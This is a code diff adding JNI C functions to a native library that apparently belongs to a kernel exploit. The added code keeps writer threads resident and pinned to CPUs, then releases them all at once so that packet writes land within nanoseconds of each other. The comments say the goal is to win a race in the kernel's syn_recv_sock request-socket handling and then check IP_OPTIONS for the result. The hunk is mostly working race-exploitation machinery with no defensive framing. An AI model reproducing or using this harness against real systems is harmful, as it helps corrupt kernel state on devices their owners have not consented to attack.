@@ -1165,6 +1165,164 @@ Java_com_inj_Native_dualWrite(JNIEnv *env, jclass cls, jint fd,
     }
     return 0;
 }
+// Resident writers, released by a shared generation counter.
+//
+// Creating the two threads per round looked fine but measured badly: the gap
+// between the two write() calls ends up larger than syn_recv_sock itself, so
+// the second packet always arrives after the first one has already taken the
+// request socket out of the hash. These threads live for the whole run, sit on
+// their own cores, and are released by one store, so both writes leave within
+// a hundred nanoseconds of each other.
+#define DUO_MAX 8
+
+typedef struct {
+    volatile int run;
+    volatile int seq;
+    volatile int done;
+    int fd;
+    int cpu;
+    int len;
+    unsigned char pkt[2048];
+} duo_slot;
+
+static duo_slot g_ds[DUO_MAX];
+static volatile int g_gate;
+static volatile int g_arrived;
+
+static void *duo_resident(void *arg)
+{
+    int idx = (int) (intptr_t) arg;
+    duo_slot *s = &g_ds[idx];
+    unsigned long mask = 1UL << s->cpu;
+    int seen = 0;
+
+    syscall(__NR_sched_setaffinity, 0, sizeof mask, &mask);
+
+    for (;;) {
+        if (!s->run) {
+            usleep(200);
+            continue;
+        }
+        if (s->seq == seen) {
+            __asm__ __volatile__("yield");
+            continue;
+        }
+        seen = s->seq;
+
+        /* Announce readiness, then wait for the single release store. */
+        __sync_add_and_fetch(&g_arrived, 1);
+        while (!g_gate) {
+            __asm__ __volatile__("yield");
+        }
+
+        write(s->fd, s->pkt, (size_t) s->len);
+        s->done = seen;
+    }
+    return NULL;
+}
+
+JNIEXPORT jint JNICALL
+Java_com_inj_Native_duoStart(JNIEnv *env, jclass cls, jint slot, jint cpu)
+{
+    pthread_t t;
+    (void)env;
+    (void)cls;
+    if (slot < 0 || slot >= DUO_MAX) {
+        return -1;
+    }
+    g_ds[slot].cpu = cpu;
+    g_ds[slot].run = 1;
+    g_ds[slot].seq = 0;
+    g_ds[slot].done = 0;
+    if (pthread_create(&t, NULL, duo_resident, (void *) (intptr_t) slot) != 0) {
+        g_ds[slot].run = 0;
+        return -2;
+    }
+    pthread_detach(t);
+    return 0;
+}
+
+JNIEXPORT jint JNICALL
+Java_com_inj_Native_duoArm(JNIEnv *env, jclass cls, jint slot, jint fd,
+                           jbyteArray pkt, jint len)
+{
+    jbyte *p;
+    (void)env;
+    (void)cls;
+    if (slot < 0 || slot >= DUO_MAX || len <= 0 || len > 2048) {
+        return -1;
+    }
+    p = (*env)->GetByteArrayElements(env, pkt, NULL);
+    if (p == NULL) {
+        return -2;
+    }
+    memcpy(g_ds[slot].pkt, p, (size_t) len);
+    (*env)->ReleaseByteArrayElements(env, pkt, p, JNI_ABORT);
+    g_ds[slot].fd = fd;
+    g_ds[slot].len = len;
+    return 0;
+}
+
+/** Release every armed slot in the same instant; returns slots fired. */
+JNIEXPORT jint JNICALL
+Java_com_inj_Native_duoFire(JNIEnv *env, jclass cls)
+{
+    int i, armed = 0, spin;
+    (void)env;
+    (void)cls;
+
+    for (i = 0; i < DUO_MAX; i++) {
+        if (g_ds[i].run && g_ds[i].seq != g_ds[i].done) {
+            /* previous round still in flight */
+            return -1;
+        }
+    }
+
+    for (i = 0; i < DUO_MAX; i++) {
+        if (g_ds[i].run && g_ds[i].len > 0) {
+            armed++;
+        }
+    }
+    if (armed == 0) {
+        return 0;
+    }
+
+    g_gate = 0;
+    g_arrived = 0;
+    __sync_synchronize();
+
+    for (i = 0; i < DUO_MAX; i++) {
+        if (g_ds[i].run && g_ds[i].len > 0) {
+            g_ds[i].seq++;
+        }
+    }
+
+    /* Wait until every armed writer is parked at the gate, then open it. */
+    for (spin = 0; g_arrived < armed && spin < 20000000; spin++) {
+        __asm__ __volatile__("yield");
+    }
+    __sync_synchronize();
+    g_gate = 1;
+
+    /* Wait for them to finish so the caller can see the effect. */
+    for (spin = 0; spin < 20000000; spin++) {
+        int pending = 0;
+        for (i = 0; i < DUO_MAX; i++) {
+            if (g_ds[i].run && g_ds[i].len > 0 && g_ds[i].seq != g_ds[i].done) {
+                pending = 1;
+            }
+        }
+        if (!pending) {
+            break;
+        }
+        __asm__ __volatile__("yield");
+    }
+
+    for (i = 0; i < DUO_MAX; i++) {
+        g_ds[i].len = 0;
+    }
+    return armed;
+}
 // Read IP_OPTIONS from a socket and report what came back.
 //
 // If the request-socket race fired, the winning child inherited an
